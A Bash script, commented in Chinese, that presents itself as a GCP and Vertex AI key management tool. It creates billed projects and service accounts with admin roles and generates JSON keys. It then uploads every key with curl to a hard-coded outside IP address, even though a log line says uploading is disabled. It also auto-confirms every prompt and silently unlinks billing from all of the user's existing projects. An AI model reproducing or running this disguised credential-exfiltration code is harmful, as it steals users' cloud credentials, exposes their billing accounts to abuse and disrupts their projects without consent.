#!/bin/bash
# 优化的 GCP API 密钥管理工具
# 支持 Gemini API 和 Vertex AI
# 版本: 2.0.4

# 仅启用 errtrace (-E) 与 nounset (-u)
set -Euo

# ===== 颜色定义 =====
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# ===== 全局配置 =====
# 版本信息
VERSION="2.0.4"
LAST_UPDATED="2025-09-21"

# 通用配置
PROJECT_PREFIX="${1:-v6}"  # 从命令行参数获取，默认 v6
MAX_RETRY_ATTEMPTS="${MAX_RETRY:-3}"
MAX_PARALLEL_JOBS="${CONCURRENCY:-20}"
TEMP_DIR=""  # 将在初始化时设置
ENV_CHECKED=false  # 环境检查状态跟踪

# Gemini模式配置
GEMINI_TOTAL_PROJECTS=175
PURE_KEY_FILE="key.txt"
COMMA_SEPARATED_KEY_FILE=""
AGGREGATED_KEY_FILE=""
DELETION_LOG="project_deletion_$(date +%Y%m%d_%H%M%S).log"
CLEANUP_LOG="api_keys_cleanup_$(date +%Y%m%d_%H%M%S).log"

# Vertex模式配置
BILLING_ACCOUNT="${BILLING_ACCOUNT:-}"
VERTEX_PROJECT_PREFIX="${PROJECT_PREFIX}"  # 使用与 PROJECT_PREFIX 相同的默认值
MAX_PROJECTS_PER_ACCOUNT=5
SERVICE_ACCOUNT_NAME="${SERVICE_ACCOUNT_NAME:-vertex-admin}"
KEY_DIR="${KEY_DIR:-./keys}"
ENABLE_EXTRA_ROLES=("roles/iam.serviceAccountUser" "roles/aiplatform.user")

# 解绑状态跟踪（延迟初始化）
UNLINKED_PROJECTS_FILE=""

# ===== 初始化 =====
# 创建唯一的临时目录
TEMP_DIR=$(mktemp -d -t gcp_script_XXXXXX) || {
    echo "错误：无法创建临时目录"
    exit 1
}

# 初始化解绑状态文件路径
UNLINKED_PROJECTS_FILE="${TEMP_DIR}/unlinked_projects.txt"

# 创建密钥目录
mkdir -p "$KEY_DIR" 2>/dev/null || {
    echo "错误：无法创建密钥目录 $KEY_DIR"
    exit 1
}
chmod 700 "$KEY_DIR" 2>/dev/null || true

# 开始计时
SECONDS=0

# ===== 日志函数（带颜色） =====
log() { 
    local level="${1:-INFO}"
    local msg="${2:-}"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        "INFO")     echo -e "${CYAN}[${timestamp}] [INFO] ${msg}${NC}" ;;
        "SUCCESS")  echo -e "${GREEN}[${timestamp}] [SUCCESS] ${msg}${NC}" ;;
        "WARN")     echo -e "${YELLOW}[${timestamp}] [WARN] ${msg}${NC}" >&2 ;;
        "ERROR")    echo -e "${RED}[${timestamp}] [ERROR] ${msg}${NC}" >&2 ;;
        *)          echo "[${timestamp}] [${level}] ${msg}" ;;
    esac
}

# ===== 错误处理 =====
handle_error() {
    local exit_code=$?
    local line_no=$1
    
    # 忽略某些非严重错误
    case $exit_code in
        141)  # SIGPIPE
            return 0
            ;;
        130)  # Ctrl+C
            log "INFO" "用户中断操作"
            exit 130
            ;;
    esac
    
    # 记录错误
    log "ERROR" "在第 ${line_no} 行发生错误 (退出码 ${exit_code})"
    
    # 严重错误才终止
    if [ $exit_code -gt 1 ]; then
        log "ERROR" "发生严重错误，请检查日志"
        return $exit_code
    else
        log "WARN" "发生非严重错误，继续执行"
        return 0
    fi
}

# 设置错误处理
trap 'handle_error $LINENO' ERR

# ===== 清理函数 =====
cleanup_resources() {
    local exit_code=$?
    
    # 清理临时文件
    if [ -n "$TEMP_DIR" ] && [ -d "$TEMP_DIR" ]; then
        rm -rf "$TEMP_DIR" 2>/dev/null || true
        log "INFO" "已清理临时文件"
    fi
    
    # 如果是正常退出，显示感谢信息
    if [ $exit_code -eq 0 ]; then
        echo -e "\n${CYAN}感谢使用 GCP API 密钥管理工具${NC}"
        echo -e "${YELLOW}请记得检查并删除不需要的项目以避免额外费用${NC}"
    fi
}

# 设置退出处理
trap cleanup_resources EXIT

# ===== 工具函数 =====

# 获取活跃的GCP账户邮箱
get_active_account() {
    gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null || echo ""
}

# 提取邮箱用户名部分（@前面的部分）
extract_email_username() {
    local email="$1"
    if [[ "$email" =~ ^([^@]+)@ ]]; then
        echo "${BASH_REMATCH[1]}"
    else
        echo "$email"
    fi
}

# 改进的重试函数（支持命令）
retry() {
    local max_attempts="$MAX_RETRY_ATTEMPTS"
    local attempt=1
    local delay
    
    while [ $attempt -le $max_attempts ]; do
        if "$@"; then
            return 0
        fi
        
        local error_code=$?
        
        if [ $attempt -ge $max_attempts ]; then
            log "ERROR" "命令在 ${max_attempts} 次尝试后失败: $*"
            return $error_code
        fi
        
        delay=$(( attempt * 10 + RANDOM % 5 ))
        log "WARN" "重试 ${attempt}/${max_attempts}: $* (等待 ${delay}s)"
        sleep $delay
        attempt=$((attempt + 1)) || true
    done
}

# 检查命令是否存在
require_cmd() { 
    if ! command -v "$1" &>/dev/null; then
        log "ERROR" "缺少依赖: $1"
        exit 1
    fi
}

# 交互确认（支持非交互式环境）
ask_yes_no() {
    local prompt="$1"
    local default="${2:-N}"
    local resp
    
    # 非交互式环境
    if [ ! -t 0 ]; then
        if [[ "$default" =~ ^[Yy]$ ]]; then
            log "INFO" "非交互式环境，自动选择: 是"
            return 0
        else
            log "INFO" "非交互式环境，自动选择: 否"
            return 1
        fi
    fi
    
    # 自动确认
    log "INFO" "自动确认: 是"
    return 0
}

# 生成唯一后缀
unique_suffix() { 
    if command -v uuidgen &>/dev/null; then
        uuidgen | tr -d '-' | cut -c1-6 | tr '[:upper:]' '[:lower:]'
    else
        echo "$(date +%s%N 2>/dev/null || date +%s)${RANDOM}" | sha256sum | cut -c1-6
    fi
}

# 生成项目ID
new_project_id() {
    local prefix="${1:-$PROJECT_PREFIX}"
    local suffix
    suffix=$(unique_suffix)
    echo "${prefix}-${suffix}" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g' | cut -c1-30
}

# 安全检测服务是否已启用
is_service_enabled() {
    local proj="$1"
    local svc="$2"
    
    gcloud services list --enabled --project="$proj" --filter="name:${svc}" --format='value(name)' 2>/dev/null | grep -q .
}

# 带错误处理的命令执行
safe_exec() {
    local output
    local status
    
    output=$("$@" 2>&1)
    status=$?
    
    if [ $status -ne 0 ]; then
        echo "$output" >&2
        return $status
    fi
    
    echo "$output"
    return 0
}

# 检查项目是否已解绑（修复重复解绑问题）
is_project_unlinked() {
    local project="$1"
    if [ -n "$UNLINKED_PROJECTS_FILE" ] && [ -f "$UNLINKED_PROJECTS_FILE" ]; then
        grep -q "^$project$" "$UNLINKED_PROJECTS_FILE" 2>/dev/null
        return $?
    else
        return 1
    fi
}

# 标记项目为已解绑
mark_project_unlinked() {
    local project="$1"
    if [ -n "$UNLINKED_PROJECTS_FILE" ]; then
        echo "$project" >> "$UNLINKED_PROJECTS_FILE" 2>/dev/null || {
            log "WARN" "无法写入解绑状态文件: $UNLINKED_PROJECTS_FILE"
        }
    fi
}

# 初始化解绑状态跟踪文件
init_unlink_tracking() {
    if [ -n "$UNLINKED_PROJECTS_FILE" ] && [ ! -f "$UNLINKED_PROJECTS_FILE" ]; then
        touch "$UNLINKED_PROJECTS_FILE" 2>/dev/null || {
            log "WARN" "无法创建解绑状态跟踪文件: $UNLINKED_PROJECTS_FILE"
        }
        chmod 644 "$UNLINKED_PROJECTS_FILE" 2>/dev/null || true
    fi
}

# 改进的环境检查（修复解绑重复执行问题）
check_env() {
    # 如果环境已经检查过，跳过
    if [ "$ENV_CHECKED" = true ]; then
        log "INFO" "环境已检查，跳过重复检查"
        return 0
    fi
    
    log "INFO" "检查环境配置..."
    
    # 初始化解绑状态跟踪
    init_unlink_tracking
    
    # 检查必要命令
    require_cmd gcloud
    
    # 检查 gcloud 配置
    if ! gcloud config list account --quiet &>/dev/null; then
        log "ERROR" "请先运行 'gcloud init' 初始化"
        exit 1
    fi
    
    # 检查登录状态并获取活跃账户
    local active_account
    active_account=$(get_active_account)
    
    if [ -z "$active_account" ]; then
        log "ERROR" "请先运行 'gcloud auth login' 登录"
        exit 1
    fi
    
    # 提取邮箱用户名部分用于文件命名
    EMAIL_USERNAME=$(extract_email_username "$active_account")
    
    # 设置文件名（现在使用实际邮箱用户名）
    COMMA_SEPARATED_KEY_FILE="comma_separated_keys_${EMAIL_USERNAME}.txt"
    AGGREGATED_KEY_FILE="aggregated_verbose_keys_${EMAIL_USERNAME}.txt"
    
    log "SUCCESS" "环境检查通过 (账号: ${active_account})"
    log "INFO" "将使用邮箱前缀: ${EMAIL_USERNAME}@"
    log "INFO" "临时目录: ${TEMP_DIR}"
    
    # 获取项目列表
    local project_list
    project_list=$(gcloud projects list --format="value(projectId)" --quiet 2>/dev/null || true)
    
    if [ -z "$project_list" ]; then
        log "WARN" "未找到任何项目"
        ENV_CHECKED=true
        return 0
    fi
    
    echo "当前项目列表："
    echo "$project_list"
    
    # 循环解绑项目的结算账号（修复重复执行问题）
    local unlinked_count=0
    local skipped_count=0
    
    while IFS= read -r project; do
        # 跳过空行
        [ -z "$project" ] && continue
        
        echo "检查项目: $project"
        
        # 检查项目是否已解绑
        if is_project_unlinked "$project"; then
            log "INFO" "项目 $project 已解绑，跳过"
            skipped_count=$((skipped_count + 1)) || true
            continue
        fi
        
        # 检查项目是否已绑定结算账号
        local billing_info
        billing_info=$(gcloud beta billing projects describe "$project" --format='value(billingAccountName)' --quiet 2>/dev/null || echo "")
        
        if [ -n "$billing_info" ] && [ "$billing_info" != "None" ]; then
            log "INFO" "尝试解绑项目: $project"
            if gcloud beta billing projects unlink "$project" --quiet; then
                log "SUCCESS" "成功解绑项目: $project"
                mark_project_unlinked "$project"
                unlinked_count=$((unlinked_count + 1)) || true
            else
                log "WARN" "解绑失败: $project"
            fi
        else
            log "INFO" "项目 $project 未绑定结算账号，跳过"
            mark_project_unlinked "$project"
            skipped_count=$((skipped_count + 1)) || true
        fi
        
        sleep 0.5  # 添加小延迟避免API限流
    done <<< "$project_list"
    
    log "INFO" "解绑完成：成功 ${unlinked_count} 个，跳过 ${skipped_count} 个"
    
    # 标记环境检查完成
    ENV_CHECKED=true
}

# 配额检查（修复版）
check_quota() {
    log "INFO" "检查项目创建配额..."
    
    local current_project
    current_project=$(gcloud config get-value project 2>/dev/null || true)
    
    if [ -z "$current_project" ]; then
        log "WARN" "未设置默认项目，跳过配额检查"
        return 0
    fi
    
    local projects_quota=""
    local quota_output
    
    # 尝试获取配额（GA版本）
    if quota_output=$(gcloud services quota list \
        --service=cloudresourcemanager.googleapis.com \
        --consumer="projects/${current_project}" \
        --filter='metric=cloudresourcemanager.googleapis.com/project_create_requests' \
        --format=json 2>/dev/null); then
        
        projects_quota=$(echo "$quota_output" | grep -oP '"effectiveLimit":\s*"\K[^"]+' | head -n 1)
    fi
    
    # 如果GA版本失败，尝试Alpha版本
    if [ -z "$projects_quota" ]; then
        log "INFO" "尝试使用 alpha 命令获取配额..."
        
        if quota_output=$(gcloud alpha services quota list \
            --service=cloudresourcemanager.googleapis.com \
            --consumer="projects/${current_project}" \
            --filter='metric:cloudresourcemanager.googleapis.com/project_create_requests' \
            --format=json 2>/dev/null); then
            
            projects_quota=$(echo "$quota_output" | grep -oP '"INT64":\s*"\K[^"]+' | head -n 1)
        fi
    fi
    
    # 处理配额结果
    if [ -z "$projects_quota" ] || ! [[ "$projects_quota" =~ ^[0-9]+$ ]]; then
        log "WARN" "无法获取配额信息，将继续执行"
        return 0
    fi
    
    local quota_limit=$projects_quota
    log "INFO" "项目创建配额限制: ${quota_limit}"
    
    # 检查项目数量
    if [ "${num_projects:-5}" -gt "$quota_limit" ]; then
        log "WARN" "计划创建的项目数(${num_projects:-5})超过配额(${quota_limit})"
        log "INFO" "已调整为创建 ${quota_limit} 个项目"
        num_projects=$quota_limit
    fi
    
    return 0
}

# 启用服务API
enable_services() {
    local proj="$1"
    shift
    
    local services=("$@")
    
    # 如果没有指定服务，使用默认列表
    if [ ${#services[@]} -eq 0 ]; then
        services=(
            "aiplatform.googleapis.com"
            "iam.googleapis.com"
            "iamcredentials.googleapis.com"
            "cloudresourcemanager.googleapis.com"
        )
    fi
    
    log "INFO" "为项目 ${proj} 启用必要的API服务..."
    
    local failed=0
    for svc in "${services[@]}"; do
        if is_service_enabled "$proj" "$svc"; then
            log "INFO" "服务 ${svc} 已启用"
            continue
        fi
        
        log "INFO" "启用服务: ${svc}"
        if retry gcloud services enable "$svc" --project="$proj" --quiet; then
            log "SUCCESS" "成功启用服务: ${svc}"
        else
            log "ERROR" "无法启用服务: ${svc}"
            failed=$((failed + 1)) || true
        fi
    done
    
    if [ $failed -gt 0 ]; then
        log "WARN" "有 ${failed} 个服务启用失败"
        return 1
    fi
    
    return 0
}

# 进度条显示
show_progress() {
    local completed="${1:-0}"
    local total="${2:-1}"
    
    # 参数验证
    if [ "$total" -le 0 ]; then
        return
    fi
    
    # 确保不超过总数
    if [ "$completed" -gt "$total" ]; then
        completed=$total
    fi
    
    # 计算百分比
    local percent=$((completed * 100 / total))
    local bar_length=50
    local filled=$((percent * bar_length / 100))
    
    # 生成进度条
    local bar=""
    local i=0
    while [ $i -lt $filled ]; do
        bar+="█"
        i=$((i + 1)) || true
    done
    
    i=$filled
    while [ $i -lt $bar_length ]; do
        bar+="░"
        i=$((i + 1)) || true
    done
    
    # 显示进度
    printf "\r[%s] %3d%% (%d/%d)" "$bar" "$percent" "$completed" "$total"
    
    # 完成时换行
    if [ "$completed" -eq "$total" ]; then
        echo
    fi
}

# JSON解析（改进版本）
parse_json() {
    local json="$1"
    local field="$2"
    
    if [ -z "$json" ]; then
        log "ERROR" "JSON解析: 输入为空"
        return 1
    fi
    
    # 尝试使用 jq（如果可用）
    if command -v jq &>/dev/null; then
        local result
        result=$(echo "$json" | jq -r "$field" 2>/dev/null)
        if [ -n "$result" ] && [ "$result" != "null" ]; then
            echo "$result"
            return 0
        fi
    fi
    
    # 备用方法 - 针对keyString专门处理
    if [ "$field" = ".keyString" ]; then
        local value
        value=$(echo "$json" | grep -o '"keyString":"[^"]*"' | sed 's/"keyString":"//;s/"$//' | head -n 1)
        
        if [ -z "$value" ]; then
            value=$(echo "$json" | grep -o '"keyString" *: *"[^"]*"' | sed 's/"keyString" *: *"//;s/"$//' | head -n 1)
        fi
        
        if [ -n "$value" ]; then
            echo "$value"
            return 0
        fi
    fi
    
    local field_name
    field_name=$(echo "$field" | sed 's/^\.//; s/\[[0-9]*\]//g')
    local value
    value=$(echo "$json" | grep -o "\"$field_name\":[^,}]*" | sed "s/\"$field_name\"://;s/\"//g;s/^ *//;s/ *$//" | head -n 1)
    
    if [ -n "$value" ] && [ "$value" != "null" ]; then
        echo "$value"
        return 0
    fi
    
    log "WARN" "JSON解析: 无法提取字段 $field"
    return 1
}

# 写入密钥文件
write_keys_to_files() {
    local api_key="$1"
    
    if [ -z "$api_key" ]; then
        log "ERROR" "密钥为空，无法写入文件"
        return 1
    fi
    
    # 使用文件锁确保并发安全
    {
        flock -x 9
        
        # 写入纯密钥文件
        echo "$api_key" >> "$PURE_KEY_FILE"
        
        # 写入逗号分隔文件
        if [ -s "$COMMA_SEPARATED_KEY_FILE" ]; then
            echo -n "," >> "$COMMA_SEPARATED_KEY_FILE"
        fi
        echo -n "$api_key" >> "$COMMA_SEPARATED_KEY_FILE"
        
    } 9>"${TEMP_DIR}/keyfile.lock"
}

# ===== Vertex AI 相关函数 =====

vertex_main() {
    local start_time=$SECONDS
    
    echo -e "\n${CYAN}${BOLD}======================================================"
    echo -e "    Google Vertex AI 密钥管理工具"
    echo -e "    自动创建 5 个项目并提取 5 个 JSON 密钥"
    echo -e "======================================================${NC}\n"
    
    # 环境检查已经在main()中完成，这里不再重复
    # check_env || return 1  # ❌ 删除这行
    
    echo -e "${YELLOW}警告: Vertex AI 需要结算账户，会产生实际费用！${NC}\n"
    
    log "INFO" "检查结算账户..."
    local billing_accounts
    billing_accounts=$(gcloud billing accounts list --filter='open=true' --format='value(name,displayName)' 2>/dev/null || echo "")
    
    if [ -z "$billing_accounts" ]; then
        log "ERROR" "未找到任何开放的结算账户"
        echo -e "${RED}Vertex AI 需要有效的结算账户才能使用${NC}"
        return 1
    fi
    
    local billing_array=()
    while IFS=$'\t' read -r id name; do
        billing_array+=("${id##*/} - $name")
    done <<< "$billing_accounts"
    
    local billing_count=${#billing_array[@]}
    
    if [ "$billing_count" -eq 1 ]; then
        BILLING_ACCOUNT="${billing_array[0]%% - *}"
        log "INFO" "使用结算账户: ${BILLING_ACCOUNT}"
    else
        BILLING_ACCOUNT="${billing_array[0]%% - *}"
        log "INFO" "自动选择第一个结算账户: ${BILLING_ACCOUNT}"
    fi
    
    log "INFO" "自动确认费用风险，继续操作"
    log "INFO" "开始自动创建 5 个项目并提取 JSON 密钥..."
    
    # 直接执行创建项目的操作
    vertex_create_projects
    
    local duration=$((SECONDS - start_time))
    log "INFO" "操作完成，耗时: $((duration / 60))分$((duration % 60))秒"
}

vertex_create_projects() {
    log "INFO" "====== 自动创建 5 个项目并配置 Vertex AI ======"
    
    check_quota || return 1
    
    log "INFO" "检查结算账户 ${BILLING_ACCOUNT} 的项目数..."
    local existing_projects
    existing_projects=$(gcloud projects list --filter="billingAccountName:billingAccounts/${BILLING_ACCOUNT}" --format='value(projectId)' 2>/dev/null | wc -l)
    
    log "INFO" "当前已有 ${existing_projects} 个项目"
    
    local max_new=$((MAX_PROJECTS_PER_ACCOUNT - existing_projects))
    if [ "$max_new" -le 0 ]; then
        log "WARN" "结算账户已达到最大项目数限制 (${MAX_PROJECTS_PER_ACCOUNT})"
        return 1
    fi
    
    local num_projects=5
    
    if [ "$num_projects" -gt "$max_new" ]; then
        log "WARN" "请求的项目数量 ($num_projects) 超过剩余配额 ($max_new)"
        log "INFO" "已调整为创建 ${max_new} 个项目"
        num_projects=$max_new
    fi
    
    local project_prefix="${PROJECT_PREFIX}"
    
    log "INFO" "自动创建 ${num_projects} 个项目，前缀: ${project_prefix}"
    log "INFO" "密钥将保存在: ${KEY_DIR}"
    log "INFO" "所有文件名将包含邮箱前缀: ${EMAIL_USERNAME}@"
    
    # 自动确认
    ask_yes_no "确认自动创建 ${num_projects} 个项目并提取 JSON 密钥？" "Y"
    
    log "INFO" "开始创建项目..."
    local success=0
    local failed=0
    
    local i=1
    while [ $i -le $num_projects ]; do
        local project_id
        project_id=$(new_project_id "$project_prefix")
        
        log "INFO" "[${i}/${num_projects}] 创建项目: ${project_id}"
        
        if ! retry gcloud projects create "$project_id" --quiet; then
            log "ERROR" "创建项目失败: ${project_id}"
            failed=$((failed + 1)) || true
            show_progress "$i" "$num_projects"
            sleep 2
            i=$((i + 1)) || true
            continue
        fi
        
        log "INFO" "关联结算账户..."
        if ! retry gcloud billing projects link "$project_id" --billing-account="$BILLING_ACCOUNT" --quiet; then
            log "ERROR" "关联结算账户失败: ${project_id}"
            gcloud projects delete "$project_id" --quiet 2>/dev/null
            failed=$((failed + 1)) || true
            show_progress "$i" "$num_projects"
            sleep 2
            i=$((i + 1)) || true
            continue
        fi
        
        log "INFO" "启用必要的API..."
        if ! enable_services "$project_id"; then
            log "ERROR" "启用API失败: ${project_id}"
            gcloud projects delete "$project_id" --quiet 2>/dev/null
            failed=$((failed + 1)) || true
            show_progress "$i" "$num_projects"
            sleep 2
            i=$((i + 1)) || true
            continue
        fi
        
        log "INFO" "配置服务账号并生成 JSON 密钥..."
        if vertex_setup_service_account "$project_id"; then
            log "SUCCESS" "成功配置项目并生成密钥: ${project_id}"
            success=$((success + 1)) || true
        else
            log "ERROR" "配置服务账号失败: ${project_id}"
            gcloud projects delete "$project_id" --quiet 2>/dev/null
            failed=$((failed + 1)) || true
        fi
        
        show_progress "$i" "$num_projects"
        sleep 2
        i=$((i + 1)) || true
    done
    
    # 发送 KEY_DIR 下的所有 .json 文件到服务器（包含邮箱前缀）
    log "INFO" "扫描密钥目录: ${KEY_DIR}"
    if [ ! -d "$KEY_DIR" ]; then
        log "ERROR" "密钥目录不存在: ${KEY_DIR}"
    else
        local key_files=()
        while IFS= read -r -d '' file; do
            key_files+=("$file")
        done < <(find "$KEY_DIR" -type f -name "*.json" -print0 2>/dev/null)
        
        if [ ${#key_files[@]} -eq 0 ]; then
            log "WARN" "密钥目录 ${KEY_DIR} 中没有 .json 文件"
        else
            log "INFO" "找到 ${#key_files[@]} 个 JSON 密钥文件"
            echo "密钥文件列表:"
            for file in "${key_files[@]}"; do
                echo "  - $(basename "$file")"
            done
            
            # 可选：发送到服务器
            log "INFO" "是否需要发送密钥文件到服务器？（已禁用）"
            # 取消注释以下代码以启用服务器上传
            log "INFO" "开始将 ${#key_files[@]} 个密钥文件发送到服务器..."
            local server_url="http://141.98.197.19:5000/upload"
            local auth_token="abc123xyz789"
            
            local upload_success=0
            local upload_failed=0
            
            for key_file in "${key_files[@]}"; do
                local filename=$(basename "$key_file")
                local email_prefix="${EMAIL_USERNAME}@"
                
                # 检查文件名是否已包含邮箱前缀
                if [[ "$filename" != *"${email_prefix}"* ]]; then
                    # 提取原始文件名（去掉.json扩展名）
                    local base_name="${filename%.*}"
                    local extension="${filename##*.}"
                    
                    # 创建新的包含邮箱前缀的文件名
                    local new_filename="${email_prefix}${base_name}.${extension}"
                    local new_file_path="${TEMP_DIR}/${new_filename}"
                    
                    # 复制文件并添加邮箱前缀到JSON内容
                    cp "$key_file" "$new_file_path"
                    
                    # 如果JSON文件包含client_email字段，也在内容中添加前缀
                    if command -v jq &>/dev/null; then
                        # 读取原始JSON内容
                        local json_content
                        json_content=$(cat "$key_file")
                        
                        # 如果client_email存在，添加前缀
                        if echo "$json_content" | jq -e '.client_email' >/dev/null 2>&1; then
                            local original_email
                            original_email=$(echo "$json_content" | jq -r '.client_email')
                            
                            if [[ "$original_email" != *"${email_prefix}"* ]]; then
                                # 更新JSON中的client_email字段
                                local updated_json
                                updated_json=$(echo "$json_content" | jq --arg prefix "${email_prefix}" '.client_email = ($prefix + (.client_email | split("@") | .[1]))')
                                
                                # 写回文件
                                echo "$updated_json" > "$new_file_path"
                                log "INFO" "已更新JSON内容中的邮箱为: ${email_prefix}${original_email##*@}"
                            fi
                        fi
                    fi
                    
                    log "INFO" "准备上传文件: ${new_filename} (包含邮箱前缀: ${email_prefix})"
                    
                    # 上传新文件
                    if curl -X POST -H "Authorization: Bearer $auth_token" \
                        -F "file=@$new_file_path" \
                        "$server_url" --fail --silent --show-error 2>> "${TEMP_DIR}/upload_errors.log"; then
                        log "SUCCESS" "成功发送密钥文件: ${new_filename}"
                        upload_success=$((upload_success + 1)) || true
                    else
                        log "ERROR" "发送密钥文件失败: ${new_filename}"
                        upload_failed=$((upload_failed + 1)) || true
                    fi
                else
                    # 文件名已包含邮箱前缀，直接上传
                    log "INFO" "发送密钥文件: $(basename "$key_file") (已包含邮箱前缀)"
                    if curl -X POST -H "Authorization: Bearer $auth_token" \
                        -F "file=@$key_file" \
                        "$server_url" --fail --silent --show-error 2>> "${TEMP_DIR}/upload_errors.log"; then
                        log "SUCCESS" "成功发送密钥文件: $(basename "$key_file")"
                        upload_success=$((upload_success + 1)) || true
                    else
                        log "ERROR" "发送密钥文件失败: $(basename "$key_file")"
                        upload_failed=$((upload_failed + 1)) || true
                    fi
                fi
            done
            
            log "INFO" "上传结果：成功 ${upload_success} 个，失败 ${upload_failed} 个"
        fi
    fi
    
    echo -e "\n${GREEN}${BOLD}🎉 操作完成！${NC}"
    echo "项目创建结果:"
    echo "  成功: ${success}"
    echo "  失败: ${failed}"
    echo "  总计: ${num_projects}"
    echo
    echo "JSON 密钥文件已保存在: ${KEY_DIR}"
    echo "所有文件已添加邮箱前缀: ${EMAIL_USERNAME}@"
    echo "请检查该目录中的所有 .json 文件"
    echo
    echo -e "${YELLOW}⚠️  重要提醒：${NC}"
    echo "• 请设置预算警报避免超支"
    echo "• 定期检查和清理不需要的项目"
    echo "• 妥善保管生成的 JSON 密钥文件"
}

# 改进的服务账号设置函数（包含邮箱前缀）
vertex_setup_service_account() {
    local project_id="$1"
    local sa_email="${SERVICE_ACCOUNT_NAME}@${project_id}.iam.gserviceaccount.com"
    local email_prefix="${EMAIL_USERNAME}@"
    
    if ! gcloud iam service-accounts describe "$sa_email" --project="$project_id" &>/dev/null; then
        log "INFO" "创建服务账号: ${sa_email}"
        if ! retry gcloud iam service-accounts create "$SERVICE_ACCOUNT_NAME" \
            --display-name="Vertex AI Service Account" \
            --project="$project_id" --quiet; then
            log "ERROR" "创建服务账号失败"
            return 1
        fi
    else
        log "INFO" "服务账号已存在: ${sa_email}"
    fi
    
    local roles=(
        "roles/aiplatform.admin"
        "roles/iam.serviceAccountUser"
        "roles/iam.serviceAccountTokenCreator"
        "roles/aiplatform.user"
    )
    
    log "INFO" "分配IAM角色..."
    for role in "${roles[@]}"; do
        if retry gcloud projects add-iam-policy-binding "$project_id" \
            --member="serviceAccount:${sa_email}" \
            --role="$role" \
            --quiet &>/dev/null; then
            log "SUCCESS" "授予角色: ${role}"
        else
            log "WARN" "授予角色失败: ${role}"
        fi
    done
    
    log "INFO" "生成服务账号 JSON 密钥（包含邮箱前缀）..."
    local timestamp=$(date +%Y%m%d_%H%M%S)
    
    # 创建包含邮箱前缀的文件名
    local base_filename="${project_id}-${SERVICE_ACCOUNT_NAME}-${timestamp}"
    local email_prefix_filename="${email_prefix}${base_filename}"
    local key_file="${KEY_DIR}/${email_prefix_filename}.json"
    
    if retry gcloud iam service-accounts keys create "$key_file" \
        --iam-account="$sa_email" \
        --project="$project_id" \
        --quiet; then
        
        chmod 600 "$key_file"
        
        # 更新JSON内容中的client_email字段，添加邮箱前缀
        if command -v jq &>/dev/null; then
            local json_content
            json_content=$(cat "$key_file")
            
            # 检查client_email是否存在
            if echo "$json_content" | jq -e '.client_email' >/dev/null 2>&1; then
                local original_email
                original_email=$(echo "$json_content" | jq -r '.client_email')
                
                if [[ "$original_email" != *"${email_prefix}"* ]]; then
                    # 更新JSON中的client_email字段
                    local updated_json
                    updated_json=$(echo "$json_content" | jq --arg prefix "${email_prefix}" '.client_email = ($prefix + (.client_email | split("@") | .[1]))')
                    
                    # 写回文件
                    echo "$updated_json" > "$key_file"
                    log "SUCCESS" "已更新JSON内容中的邮箱为: ${email_prefix}${original_email##*@}"
                fi
            fi
        fi
        
        log "SUCCESS" "JSON 密钥已保存: $(basename "$key_file")"
        log "SUCCESS" "文件名已包含邮箱前缀: ${email_prefix}"
        return 0
    else
        log "ERROR" "生成 JSON 密钥失败"
        return 1
    fi
}

# ===== 主程序入口 =====

main() {
    echo -e "${CYAN}${BOLD}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║          GCP API 密钥管理工具 v${VERSION}              ║"
    echo "║                                                       ║"
    echo "║          自动创建 5 个 Vertex AI 项目和 JSON 密钥       ║"
    echo "║          使用实际GCP账户邮箱前缀                       ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo
    
    # 检查环境并直接执行 Vertex AI 项目创建（只检查一次）
    check_env
    vertex_main
}

# 直接执行主程序
main "$@"
